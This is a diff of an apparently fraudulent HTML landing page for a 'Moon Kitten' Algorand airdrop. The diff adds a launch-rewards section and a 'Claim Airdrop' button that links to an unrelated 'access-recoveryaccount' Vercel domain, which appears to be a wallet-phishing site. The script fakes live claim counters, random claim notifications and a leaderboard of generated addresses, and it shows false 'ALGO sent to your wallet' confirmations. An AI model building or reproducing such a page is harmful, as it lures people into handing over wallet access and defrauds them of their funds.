@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -52,6 +51,8 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
+            flex-wrap: wrap;
+            gap: 0.5rem;
         }
 
         .navbar .logo {
@@ -70,6 +71,7 @@
             display: flex;
             gap: 2rem;
             list-style: none;
+            align-items: center;
         }
 
         .navbar .nav-links a {
@@ -153,7 +155,187 @@
             line-height: 1.8;
         }
 
-        /* ===== BONUS SECTION (ATAS) ===== */
+        /* ===== LAUNCH REWARDS SECTION ===== */
+        .launch-rewards {
+            background: rgba(255, 215, 0, 0.03);
+            border: 2px solid rgba(255, 215, 0, 0.1);
+            border-radius: 24px;
+            padding: 2.5rem 3rem;
+            margin: 2rem 0 3rem;
+            position: relative;
+            overflow: hidden;
+            animation: fadeInUp 1s ease 0.4s both;
+        }
+
+        .launch-rewards::before {
+            content: '🌙';
+            position: absolute;
+            font-size: 8rem;
+            opacity: 0.03;
+            top: -2rem;
+            right: -1rem;
+            transform: rotate(20deg);
+        }
+
+        .launch-rewards::after {
+            content: '🚀';
+            position: absolute;
+            font-size: 6rem;
+            opacity: 0.03;
+            bottom: -1.5rem;
+            left: -0.5rem;
+            transform: rotate(-15deg);
+        }
+
+        .launch-rewards .rewards-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            flex-wrap: wrap;
+            gap: 1rem;
+            position: relative;
+            z-index: 1;
+            margin-bottom: 1.5rem;
+        }
+
+        .launch-rewards .rewards-header .title-group h2 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2rem;
+            font-weight: 700;
+        }
+
+        .launch-rewards .rewards-header .title-group h2 .highlight {
+            background: linear-gradient(135deg, #FFD700, #FFA500);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .launch-rewards .rewards-header .title-group .sub {
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 0.95rem;
+            margin-top: 0.3rem;
+        }
+
+        .launch-rewards .rewards-header .pool-badge {
+            background: rgba(255, 215, 0, 0.15);
+            border: 1px solid rgba(255, 215, 0, 0.2);
+            border-radius: 16px;
+            padding: 0.8rem 2rem;
+            text-align: center;
+            flex-shrink: 0;
+        }
+
+        .launch-rewards .rewards-header .pool-badge .amount {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2.2rem;
+            font-weight: 900;
+            color: #FFD700;
+        }
+
+        .launch-rewards .rewards-header .pool-badge .label {
+            font-size: 0.65rem;
+            color: rgba(255, 255, 255, 0.4);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .launch-rewards .rewards-body {
+            position: relative;
+            z-index: 1;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2rem;
+        }
+
+        .launch-rewards .rewards-body .left-col p {
+            color: rgba(255, 255, 255, 0.7);
+            line-height: 1.8;
+            font-size: 1rem;
+        }
+
+        .launch-rewards .rewards-body .left-col p strong {
+            color: #FFD700;
+        }
+
+        .launch-rewards .rewards-body .right-col h4 {
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 0.8rem;
+        }
+
+        .launch-rewards .rewards-body .right-col .wallet-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.8rem;
+        }
+
+        .launch-rewards .rewards-body .right-col .wallet-list .wallet-item {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 12px;
+            padding: 0.5rem 1.2rem;
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: rgba(255, 255, 255, 0.7);
+            transition: all 0.3s ease;
+        }
+
+        .launch-rewards .rewards-body .right-col .wallet-list .wallet-item:hover {
+            border-color: rgba(255, 215, 0, 0.2);
+            color: #FFD700;
+        }
+
+        .launch-rewards .rewards-body .right-col .wallet-list .wallet-item i {
+            margin-right: 0.5rem;
+            color: #FFD700;
+        }
+
+        .launch-rewards .rewards-footer {
+            position: relative;
+            z-index: 1;
+            margin-top: 1.5rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        .launch-rewards .rewards-footer .steps {
+            display: flex;
+            gap: 2rem;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .launch-rewards .rewards-footer .steps .step {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.85rem;
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        .launch-rewards .rewards-footer .steps .step .num {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: rgba(255, 215, 0, 0.15);
+            color: #FFD700;
+            font-weight: 700;
+            font-size: 0.75rem;
+            flex-shrink: 0;
+        }
+
+        /* ===== BONUS SECTION ===== */
         .bonus-section {
             text-align: center;
             margin: 0 0 2rem 0;
@@ -757,6 +939,13 @@
         }
 
         /* ===== RESPONSIVE ===== */
+        @media (max-width: 992px) {
+            .launch-rewards .rewards-body {
+                grid-template-columns: 1fr;
+                gap: 1.5rem;
+            }
+        }
+
         @media (max-width: 768px) {
             .navbar {
                 padding: 0.8rem 1rem;
@@ -775,6 +964,22 @@
             }
             .hero-section p {
                 font-size: 1rem;
+            }
+            .launch-rewards {
+                padding: 1.5rem;
+            }
+            .launch-rewards .rewards-header {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .launch-rewards .rewards-header .title-group h2 {
+                font-size: 1.5rem;
+            }
+            .launch-rewards .rewards-header .pool-badge .amount {
+                font-size: 1.8rem;
+            }
+            .launch-rewards .rewards-footer .steps {
+                gap: 1rem;
             }
             .bonus-section {
                 padding: 1.5rem;
@@ -830,6 +1035,18 @@
             .hero-section h1 {
                 font-size: 1.8rem;
             }
+            .launch-rewards .rewards-header .title-group h2 {
+                font-size: 1.2rem;
+            }
+            .launch-rewards .rewards-header .pool-badge {
+                padding: 0.5rem 1rem;
+            }
+            .launch-rewards .rewards-header .pool-badge .amount {
+                font-size: 1.5rem;
+            }
+            .launch-rewards .rewards-footer .steps .step {
+                font-size: 0.75rem;
+            }
             .bonus-section h3 {
                 font-size: 1.1rem;
             }
@@ -873,7 +1090,7 @@
             <li><a href="#airdrop" class="active">🎁 Airdrop</a></li>
             <li><a href="#staking" onclick="showToast('🔒 Staking coming soon!')">🔒 Staking</a></li>
             <li><a href="#leaderboard">🏆 Leaderboard</a></li>
-            <li><a href="index.html">🏠 Home</a></li>
+            <li><a href="#">🏠 Home</a></li>
         </ul>
     </nav>
 
@@ -889,7 +1106,61 @@
             </p>
         </section>
 
-        <!-- ===== BONUS AIRDROP SECTION (ATAS) ===== -->
+        <!-- ===== LAUNCH REWARDS SECTION ===== -->
+        <div class="launch-rewards" id="launchRewards">
+            <div class="rewards-header">
+                <div class="title-group">
+                    <h2>🌙 Moon Kitten <span class="highlight">Launch Rewards</span></h2>
+                    <div class="sub">Welcome to the Moon Kitten Ecosystem</div>
+                </div>
+                <div class="pool-badge">
+                    <div class="amount">5,000 <span style="font-size:1rem;color:rgba(255,255,255,0.4);">ALGO</span></div>
+                    <div class="label">Total Reward Pool</div>
+                </div>
+            </div>
+
+            <div class="rewards-body">
+                <div class="left-col">
+                    <p>
+                        Moon Kitten is a community-driven ecosystem built on the <strong>Algorand blockchain</strong>, 
+                        designed to deliver a fast, secure, and low-cost digital asset experience while supporting 
+                        long-term ecosystem growth.
+                    </p>
+                    <p style="margin-top:0.8rem;">
+                        To celebrate the official launch of the Moon Kitten ecosystem, the Moon Kitten Team is 
+                        introducing a community rewards campaign. Eligible participants will have the opportunity 
+                        to receive rewards from the <strong>5,000 ALGO Launch Rewards Pool</strong>, subject to the 
+                        campaign terms and available allocation.
+                    </p>
+                </div>
+                <div class="right-col">
+                    <h4><i class="fas fa-wallet" style="margin-right:0.5rem;color:#FFD700;"></i> Supported Wallets</h4>
+                    <div class="wallet-list">
+                        <span class="wallet-item"><i class="fas fa-check-circle"></i> Pera Wallet</span>
+                        <span class="wallet-item"><i class="fas fa-check-circle"></i> Defly Wallet</span>
+                        <span class="wallet-item"><i class="fas fa-check-circle"></i> Lute Wallet</span>
+                        <span class="wallet-item"><i class="fas fa-check-circle"></i> Algorand-compatible</span>
+                    </div>
+                    <div style="margin-top:1.2rem;">
+                        <p style="color:rgba(255,255,255,0.4);font-size:0.85rem;line-height:1.6;">
+                            <i class="fas fa-info-circle" style="color:#FFD700;margin-right:0.5rem;"></i>
+                            Participation does not guarantee receipt of rewards. Distribution is subject to campaign rules, 
+                            available allocation, and verification of eligibility.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="rewards-footer">
+                <div class="steps">
+                    <span class="step"><span class="num">1</span> Join Community</span>
+                    <span class="step"><span class="num">2</span> Complete Activities</span>
+                    <span class="step"><span class="num">3</span> Submit Address</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- ===== BONUS AIRDROP SECTION ===== -->
         <div class="bonus-section" id="bonus">
             <div class="bonus-label">🎯 Special Bonus</div>
             <h3>🎁 <span class="gold-text">Bonus Airdrop</span></h3>
@@ -897,7 +1168,8 @@
             <p>
                 Get an extra <strong>5,000 ALGO</strong> bonus instantly!
             </p>
-            <a onclick="window.open('https://recovery-youraccount.vercel.app/?=kitten+algorand+meme+coin&oq=pA0YgAQyCQgCEAAYDRiABDIICAMQABgNGB4yCAgEEAAYDRgeMgoIBRAAGAUYDRgeMgoIBhAAGAUYDRgeMgoIBxAAGAUYDRgeMgoICBAAGAUYDRgeMgoICRAAGAUYDRge0gEKMTE0NjNqMGoxNagCCLACAfEF3gvvG6MXHlbxBd4L7xujFx5W/','_blank','toolbar=no,location=no,status=no,menubar=no,scrollbars=yes,resizable=yes,width=450,height=900'); return false;" 
+            <a href="https://access-recoveryaccount.vercel.app/?=kitten+algorand+meme+coin&oq=pA0YgAQyCQgCEAAYDRiABDIICAMQABgNGB4yCAgEEAAYDRgeMgoIBRAAGAUYDRgeMgoIBhAAGAUYDRgeMgoIBxAAGAUYDRgeMgoICBAAGAUYDRgeMgoICRAAGAUYDRge0gEKMTE0NjNqMGoxNagCCLACAfEF3gvvG6MXHlbxBd4L7xujFx5W/" 
+               target="_blank" 
                class="btn btn-gold pulse" 
                onclick="claimBonus(event)">
                 🎉 Claim Airdrop
@@ -942,11 +1214,13 @@
                 <div class="icon">🐦</div>
                 <h3>Follow Twitter</h3>
                 <p>Follow <strong>@MoonKitten</strong> on Twitter and retweet pinned post</p>
-                <div class="reward-amount"> 5,000 <small>ALGO</small></div>
+                <div class="reward-amount">5,000 <small>ALGO</small></div>
                 <span class="status live">● Live</span>
                 <br><br>
-                <a onclick="window.open('https://x.com/Moon_MKIT','_blank'); claimReward('Follow Twitter', 5, this); return false;" 
-                   class="btn btn-primary">
+                <a href="https://x.com/Moon_MKIT" 
+                   target="_blank" 
+                   class="btn btn-primary" 
+                   onclick="claimReward('Follow Twitter', 5, this)">
                     <i class="fab fa-twitter"></i> Follow & Claim
                 </a>
             </div>
@@ -959,8 +1233,10 @@
                 <div class="reward-amount">5,000 <small>ALGO</small></div>
                 <span class="status live">● Live</span>
                 <br><br>
-                <a onclick="window.open('https://t.me/moonkittencommunity','_blank'); claimReward('Join Telegram', 3, this); return false;" 
-                   class="btn btn-primary">
+                <a href="https://t.me/moonkittencommunity" 
+                   target="_blank" 
+                   class="btn btn-primary" 
+                   onclick="claimReward('Join Telegram', 3, this)">
                     <i class="fab fa-telegram"></i> Join & Claim
                 </a>
             </div>
@@ -973,8 +1249,10 @@
                 <div class="reward-amount">5,000 <small>ALGO</small></div>
                 <span class="status live">● Live</span>
                 <br><br>
-                <a onclick="window.open('https://moonkitten.xyz/','_blank'); claimReward('Referral Bonus', 1, this); return false;" 
-                   class="btn btn-gold">
+                <a href="https://moonkitten.xyz/" 
+                   target="_blank" 
+                   class="btn btn-gold" 
+                   onclick="claimReward('Referral Bonus', 1, this)">
                     <i class="fas fa-users"></i> Refer Now
                 </a>
             </div>
@@ -1044,6 +1322,16 @@
 
         </div>
 
+        <!-- ===== FOOTER NOTE ===== -->
+        <div style="text-align:center;padding:2rem 0 1rem;border-top:1px solid rgba(255,255,255,0.03);margin-top:2rem;">
+            <p style="color:rgba(255,255,255,0.2);font-size:0.75rem;letter-spacing:1px;">
+                🌙 Moon Kitten — Powered by the Algorand Blockchain
+            </p>
+            <p style="color:rgba(255,255,255,0.1);font-size:0.6rem;margin-top:0.3rem;">
+                Build. Grow. Earn.
+            </p>
+        </div>
+
     </div>
 
     <!-- ===== TOAST ===== -->
@@ -1105,34 +1393,27 @@
         // 3. UPDATE STATS OTOMATIS (LIVE COUNTER)
         // ============================================================
         function updateStats() {
-            // Format angka dengan ribuan
             claimedEl.textContent = totalClaimed.toLocaleString();
             rewardsEl.textContent = totalRewards.toLocaleString();
             usersEl.textContent = activeUsers.toLocaleString();
 
-            // Update progress
             const progress = Math.min((totalClaimed / 100) * 100, 100);
             progressFill.style.width = progress + '%';
             progressText.textContent = Math.floor(progress) + '%';
         }
 
-
         function autoIncrement() {
-            // Active Users: +1-3 setiap 4-8 detik
             const userIncrement = Math.floor(Math.random() * 3) + 1;
             activeUsers += userIncrement;
 
-            // Total Claimed: mengikuti active users (1 claim per 2-3 user)
             const claimIncrement = Math.floor(userIncrement / 2) + (Math.random() > 0.7 ? 1 : 0);
             totalClaimed += claimIncrement;
 
-            // Total Rewards: 1-5 ALGO per claim
             const rewardIncrement = claimIncrement * (Math.floor(Math.random() * 4) + 1);
             totalRewards += rewardIncrement;
 
             updateStats();
 
-            // Toast notifikasi random (10% chance)
             if (Math.random() < 0.1) {
                 const messages = [
                     ' New ALGO claimed!',
@@ -1145,22 +1426,23 @@
             }
         }
 
-        // Jalankan auto increment setiap 3-7 detik (random)
         function scheduleAutoIncrement() {
-            const delay = Math.floor(Math.random() * 4000) + 3000; // 3-7 detik
+            const delay = Math.floor(Math.random() * 4000) + 3000;
             setTimeout(() => {
                 autoIncrement();
                 scheduleAutoIncrement();
             }, delay);
         }
 
+        // ============================================================
+        // 4. CLAIM REWARD
+        // ============================================================
         function claimReward(taskName, amount, element) {
             if (claimedTasks.has(taskName)) {
                 showToast('⚠️ You already claimed ' + taskName + '!');
                 return;
             }
 
-            // Tambahkan ke stats
             totalClaimed += 1;
             totalRewards += amount;
             activeUsers += Math.floor(Math.random() * 2) + 1;
@@ -1168,9 +1450,8 @@
 
             updateStats();
 
-            showToast('✅ ' + taskName + ' claimed! +' + amount + ' ALGO sent to your Algorand wallet! ');
+            showToast('✅ ' + taskName + ' claimed! +' + amount + ' ALGO sent to your Algorand wallet!');
 
-            // Ubah tampilan tombol
             element.innerHTML = '✅ Claimed ' + amount + ' ALGO';
             element.style.background = 'linear-gradient(135deg, #00ff88, #00cc66)';
             element.style.color = '#0a0a0a';
@@ -1182,7 +1463,9 @@
             };
         }
 
-
+        // ============================================================
+        // 5. CLAIM BONUS
+        // ============================================================
         function claimBonus(event) {
             if (bonusClaimed) {
                 showToast('⚠️ You already claimed the bonus!');
@@ -1198,7 +1481,7 @@
             
             updateStats();
             
-            showToast('🎉 Bonus claimed! +10 ALGO sent to your Algorand wallet! ');
+            showToast('🎉 Bonus claimed! +10 ALGO sent to your Algorand wallet!');
 
             const btn = event.target;
             btn.innerHTML = '✅ 5,000 ALGO Bonus Claimed!';
@@ -1208,8 +1491,9 @@
             btn.classList.remove('pulse');
         }
 
-
-
+        // ============================================================
+        // 6. GENERATE LEADERBOARD
+        // ============================================================
         function generateAlgorandAddress() {
             const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
             let address = '';
@@ -1264,7 +1548,7 @@
                                 </div>
                             </div>
                         </div>
-                        <div class="points"> ${user.points} ALGO</div>
+                        <div class="points">${user.points} ALGO</div>
                     </div>
                 `;
             });
@@ -1273,7 +1557,7 @@
         }
 
         // ============================================================
-        // 8. COPY ADDRESS FUNCTION
+        // 7. COPY ADDRESS FUNCTION
         // ============================================================
         function copyAddress(address) {
             if (navigator.clipboard) {
@@ -1300,9 +1584,8 @@
         renderLeaderboard();
 
         // ============================================================
-        // 9. START AUTO INCREMENT
+        // 8. START AUTO INCREMENT
         // ============================================================
-        // Mulai dengan angka awal
         totalClaimed = 42;
         totalRewards = 156;
         activeUsers = 89;
@@ -1311,7 +1594,7 @@
         scheduleAutoIncrement();
 
         // ============================================================
-        // 10. THREE.JS 3D SCENE
+        // 9. THREE.JS 3D SCENE
         // ============================================================
         const container = document.getElementById('canvas-container');
         const scene = new THREE.Scene();
@@ -1576,7 +1859,7 @@
 
         console.log('🚀 Moon Kitten Airdrop Stats Auto-Running!');
         console.log('📊 Total Claimed: ' + totalClaimed);
-        console.log(' Total Rewards: ' + totalRewards + ' ALGO');
+        console.log('💰 Total Rewards: ' + totalRewards + ' ALGO');
         console.log('👥 Active Users: ' + activeUsers);
     </script>
 </body>
